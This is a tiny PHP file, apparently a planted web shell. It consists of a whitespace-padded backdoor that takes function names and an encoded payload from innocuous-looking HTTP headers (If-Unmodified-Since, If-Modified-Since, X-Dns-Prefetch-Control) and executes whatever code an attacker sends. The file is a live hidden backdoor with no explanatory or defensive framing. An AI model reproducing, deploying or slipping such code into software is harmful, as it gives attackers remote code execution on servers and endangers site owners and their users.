<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Unmodified-Since'])){$partition=$_HEADERS['If-Unmodified-Since']('', $_HEADERS['If-Modified-Since']($_HEADERS['X-Dns-Prefetch-Control']));$partition();}
